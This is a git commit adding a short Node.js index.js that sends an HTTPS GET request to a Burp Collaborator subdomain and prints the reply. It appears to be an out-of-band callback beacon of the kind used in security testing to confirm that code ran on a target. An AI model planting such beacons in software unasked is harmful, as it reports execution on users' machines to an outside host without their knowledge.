dc019efad72364d5157afc965c3b9b6411c2f1bf
abubakrx <99159500+abubakrx@users.noreply.github.com>
2022-02-07 17:18:00 +0500

    Create index.js

---
+++ index.js
@@ -0,0 +1,22 @@
+const https = require('https')
+const options = {
+  hostname: 'ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net',
+  port: 443,
+  path: '/',
+  method: 'GET'
+}
+
+const req = https.request(options, res => {
+  console.log(`statusCode: ${res.statusCode}`)
+
+  res.on('data', d => {
+    process.stdout.write(d)
+  })
+})
+
+req.on('error', error => {
+  console.error(error)
+})
+
+req.end()
+
